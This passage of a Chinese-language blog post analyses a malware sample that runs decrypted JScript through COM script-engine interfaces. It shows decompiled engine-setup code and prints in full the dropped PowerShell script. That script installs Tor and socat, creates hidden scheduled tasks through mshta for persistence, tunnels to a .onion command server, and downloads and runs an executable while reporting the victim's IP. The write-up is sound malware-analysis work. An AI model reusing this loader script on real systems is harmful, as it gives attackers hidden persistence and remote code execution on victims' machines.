+      3.  IActiveScript-&gt;QueryInterface()取得IActiveScriptParse接口，IActiveScriptParse接口用来解析执行jscript脚本</code></pre><h3 id="获得IActiveScript接口"><a href="#获得IActiveScript接口" class="headerlink" title="获得IActiveScript接口"></a>获得IActiveScript接口</h3><p>先调用<code>CLSIDFromProgID</code>拿到对应脚本语言引擎接口的guid,这里是jscript，然后用<code>CoCreateInstance</code>创建一个脚本引擎实例，riid为<code>IID_IActiveScript</code>;<br>返回一个<code>IActiveScript</code>对象指针，</p>
+<body bgcolor="#232323">
+<span style="white-space: pre; font-family: Consolas; ">
+<span style="color:#ffd200">HRESULT __thiscall get_jscript_engine(LPVOID *this, LPCOLESTR lpszProgID, LPUNKNOWN pUnkOuter, DWORD dwClsContext)
+</span><span><span style="color:#c0c0c0">{                                                                            </span></span>
+  <span style="color:#73adad">LPVOID *ppv</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+0h] [ebp-1Ch]
+  </span><span style="color:#73adad">HRESULT v6</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+4h] [ebp-18h]
+  </span><span style="color:#73adad">const IID guid</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+8h] [ebp-14h]
+
+<p>  ppv </p></span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#ff633c">// lpSzProgID &quot;jscript&quot;<br>  </span><span style="color:#00ffff">v6 </span><span style="color:#c0c0c0">= </span><span style="color:#f187ff">CLSIDFromProgID</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">lpszProgID</span><span style="color:#c0c0c0">, &amp;</span><span style="color:#00ffff">guid</span><span style="color:#c0c0c0">);<br>  if…<br>  </span><span style="color:#ababab">if </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">v6 &gt;</span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0 </span><span style="color:#c0c0c0">)<br>    </span><span style="color:#ff633c">// riid =  &#039;{BB1A2AE1-A4F9-11cf-8F20-00805F2CD064}&#039;;<br>    </span><span style="color:#00ffff">v6 </span><span style="color:#c0c0c0">= </span><span style="color:#f187ff">CoCreateInstance</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">guid</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">pUnkOuter</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">dwClsContext</span><span style="color:#c0c0c0">, &amp;</span><span style="color:#ffecbb">riid</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">ppv</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ababab">return </span><span style="color:#00ffff">v6</span><span style="color:#c0c0c0">;<br></span><span style="background:#646464"></span><span style="background:#00ffff"></span><span><span style="color:#c0c0c0">}                                                                            </span></span><br></span></body><p></p>
+<h3 id="run-jscript脚本"><a href="#run-jscript脚本" class="headerlink" title="run jscript脚本"></a>run jscript脚本</h3><body bgcolor="#232323">
+<span style="white-space: pre; font-family: Consolas;">
+
+<p><span style="color:#73adad">int <strong>thiscall run_jscript(JSEngine *this, encry_code *a2)<br></strong></span><span><span style="color:#c0c0c0">{                                                                                </span></span><br>  <span style="color:#73adad">int v3</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST40_4<br>  </span><span style="color:#ffd200">_DWORD *v4</span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">ST24_4<br>  </span><span style="color:#ffd200">int (stdcall ***v5)(_DWORD, void *, int)</span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">eax<br>  </span><span style="color:#73adad">int v6</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">eax<br>  </span><span style="color:#ffd200">int v7</span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">ST38_4<br>  </span><span style="color:#73adad">WCHAR *lpWideCharStr</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST34_4<br>  </span><span style="color:#73adad">int v9</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST30_4<br>  </span><span style="color:#73adad">int v10</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST2C_4</span></p>
+<p>  </p></span><span style="color:#ffecbb">get_jscript_engine</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;scriptEngine_, L&quot;</span><span style="color:#ffba18">JScript&quot;</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0x17u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v3 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;scriptEngine_);<br>  </span><span style="color:#ff633c">// COleScript::SetScriptSite<br>  </span><span style="color:#c0c0c0">(<em>(</em></span><span style="color:#00ffff">v3 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">0xC</span><span style="color:#c0c0c0">))(</span><span style="color:#00ffff">v3</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v4 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">sub_10C3380</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;field_C);<br>  </span><span style="color:#00ffff">v5 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;scriptEngine_);<br>  </span><span style="color:#ffecbb">COleScript::QueryInterface</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v5</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">v4</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v6 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;field_C);<br>  </span><span style="color:#ff633c">// COleScript::InitNew<br>  </span><span style="color:#c0c0c0">(<em>(</em></span><span style="color:#00ffff">v6 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">0xC</span><span style="color:#c0c0c0">))(</span><span style="color:#00ffff">v6</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v7 </span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size;<br>  </span><span style="color:#00ffff">lpWideCharStr </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new[]</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">2 </span><span style="color:#c0c0c0">* (</span><span style="color:#00ffff">v7 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">));<br>  </span><span style="color:#ff633c">// 将jscript代码字符都转成unicode<br>  </span><span style="color:#f187ff">MultiByteToWideChar</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;addr, </span><span style="color:#ababab">-1</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">lpWideCharStr</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">v7 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v9 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;field_C);<br>  </span><span style="color:#ff633c">// COleScript::ParseScriptText<br>  </span><span style="color:#c0c0c0">(<em>(</em></span><span style="color:#00ffff">v9 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">0x14</span><span style="color:#c0c0c0">))(</span><span style="color:#00ffff">v9</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">v9</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">lpWideCharStr</span><span style="color:#c0c0c0">, &amp;</span><span style="color:#ffecbb">dword_1103518</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">2</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v10 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;scriptEngine_);<br>  </span><span style="color:#ff633c">// COleScript::SetScriptState<br>  // 在这个函数内部执行jscript代码<br>  </span><span style="color:#ababab">return </span><span style="color:#c0c0c0">(<em>(</em></span><span style="color:#00ffff">v10 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">20</span><span style="color:#c0c0c0">))(</span><span style="color:#00ffff">v10</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">2</span><span style="color:#c0c0c0">);<br></span><span style="background:#646464"></span><span style="background:#c0c0c0"></span><span><span style="color:#c0c0c0">}                                                                                </span></span><br></body><p></p>
+<h2 id="脚本行为"><a href="#脚本行为" class="headerlink" title="脚本行为"></a>脚本行为</h2><p>脚本会释放出一个powershell脚本，可能是c2c连接已经失效，后续的行为没跑出来</p>
+<pre><code class="powershell">$SH_TYPE_SCHEDULED_TASK=1;
+$SH_TYPE_TASK_SCHEDULER=2;
+$schedulerType=$SH_TYPE_SCHEDULED_TASK;
+function FVRClsggMRAZ
+{
+param([string]$zipfile, [string]$destination);
+$7z = Join-Path $env:ALLUSERSPROFILE &#39;7za.exe&#39;;
+if (-NOT (Test-Path $7z)){
+Try
+{
+(New-Object System.Net.WebClient).DownloadFile(&#39;https://chocolatey.org/7za.exe&#39;,$7z);
+}
+Catch{}
+}
+if ($(Try { Test-Path $7z.trim() } Catch { $false })){
+Start-Process &quot;$7z&quot; -ArgumentList &quot;x -o`&quot;$destination`&quot; -y `&quot;$zipfile`&quot;&quot; -Wait -NoNewWindow
+}
+else{
+$shell = new-object -com shell.application;
+$zip = $shell.NameSpace($zipfile);
+foreach($item in $zip.items())
+{
+$shell.Namespace($destination).copyhere($item);
+}
+}
+}
+function Base64ToFile
+{
+param([string]$file, [string]$string);
+$bytes=[System.Convert]::FromBase64String($string);
+#set-content -encoding byte $file -value $bytes;
+[IO.File]::WriteAllBytes($file, $bytes);
+}
+function RandomString{
+    param([int]$min=5, [int]$max=15);
+    return (-join ((48..57)+(65..90)+(97..122) | Get-Random -Count (Get-Random -minimum $min -maximum $max) | % {[char]$_}));
+}
+function InitScheduller{
+    try{
+        Import-Module ScheduledTasks -ErrorAction Stop;
+        return $SH_TYPE_SCHEDULED_TASK;
+    }catch{
+        $File=$env:Temp+&#39;\&#39;+(RandomString)+&#39;.zip&#39;;
+        $Dest=$env:Temp+&#39;\&#39;+(RandomString);
+        while (!(iGgRLcyIJQBzrA &#39;https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg&#39; $File)) {}
+        if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
+        FVRClsggMRAZ $File $Dest;
+        Remove-Item -Force $File;
+        $TSAssembly=$Dest+&#39;\lib\net20\Microsoft.Win32.TaskScheduler.dll&#39;;
+        $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
+        return $SH_TYPE_TASK_SCHEDULER;
+    }
+}
+function xrnOlrj
+{
+param([string]$name, [string]$cmd, [string]$params=&#39;&#39;,[int]$restart=0,[int]$delay=0,[string]$dir=&#39;&#39;);
+switch ($schedulerType) {
+    $SH_TYPE_SCHEDULED_TASK {
+        $Action = New-ScheduledTaskAction -Execute $cmd;
+        if(-Not [String]::IsNullOrEmpty($params)){
+            $Action.Arguments=$params;
+        }
+        if(-Not [String]::IsNullOrEmpty($dir)){
+            $Action.WorkingDirectory=$dir;
+        }
+        $LogonTrigger = New-ScheduledTaskTrigger -AtLogOn;
+        try{
+            $LogonTrigger.UserId=$env:username;
+        }catch{
+            $LogonTrigger.User=$env:username;
+        }
+        if(-Not $delay -eq 0){
+            $LogonTrigger.Delay=New-TimeSpan -Seconds $delay;
+        }
+        if($restart -eq 1){
+            $TimeTrigger = New-ScheduledTaskTrigger -Once -At 12am -RepetitionInterval ([System.TimeSpan]::FromMinutes(1)) -RepetitionDuration ([System.TimeSpan]::FromDays(365 * 20));
+        }
+        $Settings = New-ScheduledTaskSettingsSet;
+        $Settings.DisallowStartIfOnBatteries = $False;
+        $Settings.StopIfGoingOnBatteries = $False;
+        if($restart -eq 1){
+            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger,$TimeTrigger -Settings $Settings -TaskName $name -Description (RandomString);
+        }else{
+            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger -Settings $Settings -TaskName $name -Description (RandomString);
+        }
+        Start-ScheduledTask -InputObject $Task;
+    };
+    Default {
+        $ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
+        $td=$ts.NewTask();
+        $td.RegistrationInfo.Description = (RandomString);
+        $td.Settings.DisallowStartIfOnBatteries = $False;
+        $td.Settings.StopIfGoingOnBatteries = $False;
+        $td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
+        $LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
+        $LogonTrigger.StartBoundary=[System.DateTime]::Now;
+        $LogonTrigger.UserId=$env:username;
+        $LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
+        $td.Triggers.Add($LogonTrigger);
+        if($restart -eq 1){
+        $TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
+        $TimeTrigger.StartBoundary=[System.DateTime]::Now;
+        $TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(1);
+        $TimeTrigger.Repetition.StopAtDurationEnd=$False;
+        $td.Triggers.Add($TimeTrigger);
+        }
+        $tsf=&quot;Microsoft.Win32.TaskScheduler&quot;;
+        $ExecAction=New-Object &quot;$tsf.ExecAction&quot;($cmd,$params,$dir);
+        $td.Actions.Add($ExecAction);
+        $task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
+        $task.Run();
+    };
+}
+}
+function iGgRLcyIJQBzrA {
+    param([string]$AETLcnitKnaNqr, [string]$aEntsBMtsayB);
+    $ErrorActionPreference = &quot;Stop&quot;;
+    Write-Host (&quot;Download {0} to {1}&quot; -f ($AETLcnitKnaNqr, $aEntsBMtsayB));
+    try {
+        Start-BitsTransfer -Source $AETLcnitKnaNqr -Destination $aEntsBMtsayB;
+    }
+    catch {
+        #Write-Error $_ -ErrorAction Continue;
+        try {
+            (New-Object System.Net.WebClient).DownloadFile($AETLcnitKnaNqr,$aEntsBMtsayB);
+        }
+        catch {
+            #Write-Error $_ -ErrorAction Continue;
+            Start-Process &quot;cmd.exe&quot; -ArgumentList &quot;/b /c bitsadmin /transfer /download /priority HIGH `&quot;$AETLcnitKnaNqr`&quot; `&quot;$aEntsBMtsayB`&quot;&quot; -Wait -WindowStyle Hidden;
+        }
+    }finally{
+        $ErrorActionPreference = &quot;Continue&quot;;
+    }
+    if ( $(Try { Test-Path $aEntsBMtsayB.trim() } Catch { $false })){
+        return $true;
+    }
+    return $false;
+}
+function IwoPMc{
+$schedulerType = InitScheduller;
+$tf=$env:Temp+&#39;\&#39;+(RandomString)+&#39;.zip&#39;;
+$DestTP=$env:ALLUSERSPROFILE+&#39;\&#39;+(RandomString);
+$TorMirrors=@(&quot;https://dist.torproject.org/&quot;,
+&quot;https://torproject.mirror.metalgamer.eu/dist/&quot;,
+&quot;https://tor.ybti.net/dist/&quot;);
+foreach ($mirror in $TorMirrors) {
+    $_url=$mirror+&#39;torbrowser/7.0.11/tor-win32-0.3.1.9.zip&#39;;
+    if((iGgRLcyIJQBzrA $_url $tf)){
+        break;
+    }
+}
+if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
+FVRClsggMRAZ $tf $DestTP;
+Remove-Item -Force $tf;
+$ykF=$DestTP+&#39;\Tor\&#39;;
+$WqPfv=&quot;vbscript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;tor.exe`&quot;,0,False))&quot;;
+xrnOlrj (RandomString) &#39;mshta.exe&#39; $WqPfv 0 0 $ykF;
+$SFile=$env:Temp+&#39;\&#39;+(RandomString)+&#39;.zip&#39;;
+while (!(iGgRLcyIJQBzrA &#39;https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip&#39; $SFile)){}
+FVRClsggMRAZ $SFile $DestTP;
+$s_old=$DestTP+&#39;\socat-windows-1.7.2.1\&#39;;
+$s_new=(RandomString);
+Remove-Item -Force $SFile;
+Rename-Item -path $s_old -newName $s_new;
+$dLkdOdvs=$DestTP+&#39;\&#39;+$s_new+&#39;\&#39;;
+$s1cmd=&#39;socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:qr5c2etn6x5lhhfc.onion:80,socksport=9050&#39;;
+$s2cmd=&#39;socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:qr5c2etn6x5lhhfc.onion:5588,socksport=9050&#39;;
+$SyASxV=&quot;vbscript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;$s1cmd`&quot;,0,False))&quot;;
+$CkeHaEMoQb=&quot;vbscript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;$s2cmd`&quot;,0,False))&quot;;
+xrnOlrj (RandomString) &#39;mshta.exe&#39; $SyASxV 0 0 $dLkdOdvs;
+xrnOlrj (RandomString) &#39;mshta.exe&#39; $CkeHaEMoQb 0 0 $dLkdOdvs;
+$wXdRbCFwn=&quot;vbsc&quot;+&quot;ript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;powershell.exe `&quot;`&quot;`$F=`$env:Temp+&#39;\\&quot;+(RandomString)+&quot;.exe&#39;;rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile(&#39;http://127.0.0.1:5555/&quot;+(RandomString)+&quot;.asp?ts&amp;ip=&#39;+`$cl.Download`&quot;+`&quot;String(&#39;http://api.ipify.org/&#39;),`$F);&amp; `$F`&quot;`&quot;`&quot;,0,False))&quot;;
+xrnOlrj (RandomString) &#39;mshta.exe&#39; $wXdRbCFwn 1;
+}
+IwoPMc;</code></pre>
+<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><ol>
+<li><a href="https://stackoverflow.com/questions/16846386/run-javascript-function-from-c-without-mfc" target="_blank" rel="noopener">https://stackoverflow.com/questions/16846386/run-javascript-function-from-c-without-mfc</a></li>
+</ol>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/posts/6193d55c.html">调用jscript引擎接口的malware分析</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Ken 的个人博客">Ken</a></p>
+        <p><span>发布时间:</span>2018年04月22日 - 11时11分</p>
+        <p><span>最后更新:</span>2020年03月26日 - 06时12分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/posts/6193d55c.html" title="调用jscript引擎接口的malware分析">http://shxi.me/posts/6193d55c.html</a>
+            <span class="copy-path" data-clipboard-text="原文: http://shxi.me/posts/6193d55c.html　　作者: Ken" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/posts/1736976b.html" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          debug IDApython script
+        
+      </div>
+    </a>
+  
+  
+    <a href="/posts/9222f001.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">病毒样本快到碗里来，一个样本下载爬虫的实现</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#jscript代码解密"><span class="toc-number">1.</span> <span class="toc-text">jscript代码解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#com调用jscript代码"><span class="toc-number">2.</span> <span class="toc-text">com调用jscript代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获得IActiveScript接口"><span class="toc-number">2.1.</span> <span class="toc-text">获得IActiveScript接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#run-jscript脚本"><span class="toc-number">2.2.</span> <span class="toc-text">run jscript脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本行为"><span class="toc-number">3.</span> <span class="toc-text">脚本行为</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考连接"><span class="toc-number">4.</span> <span class="toc-text">参考连接</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'ydc1992',
+      repo: 'ydc1992.github.io',
+      oauth: {
+        client_id: '',
+        client_secret: '',
+      },
+    })
+    gitment.render('gitments')
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/posts/1736976b.html" title="上一篇: debug IDApython script">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/posts/9222f001.html" title="下一篇: 病毒样本快到碗里来，一个样本下载爬虫的实现">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/posts/efe148e3.html">mbr结构和代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/61225802.html">app.any.run网站样本爬虫</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/1736976b.html">debug IDApython script</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/6193d55c.html">调用jscript引擎接口的malware分析</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/9222f001.html">病毒样本快到碗里来，一个样本下载爬虫的实现</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/7b82cd68.html">AOSP-docker编译安卓源码绕过反调试</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/27be2f79.html">VB Crypt Payload</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/9d7b1fcb.html">豆约翰博客备份专家破解</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/8f13cc3.html">Pwnable.kr shellshock</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/62077d14.html">VirusTotal扫描器 python版</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/6155f940.html">pycurl 分块下载</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/2bf6b638.html">Reversing.kr Windows kernal</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/c240cede.html">Pwnable.kr leg</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/f6e7b5bf.html">pwnable.kr mistake</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/9e24c54e.html">安卓游戏资源解密</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/b751c08a.html">Reversing.kr AutoHotkey1</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ff6aab31.html">reversing.kr Ransomware</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/905112aa.html">Far Manager插件编写2</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/88524310.html">pwnable.kr bof</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/741ff96a.html">Pwnable.kr random</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/d8e13760.html">powershell hacker(三): 后门安装 </a></li><li class="post-list-item"><a class="post-list-link" href="/posts/564bd806.html">Pwnable.kr flag</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e2bbbc71.html">powershell hacker(一): Empirse</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/15b3d1e1.html">Pwnable.kr fd</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e6d76b89.html">Reversing.kr Direct3D FPS</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 Ken
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ 
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+  
+</body>
+</html>
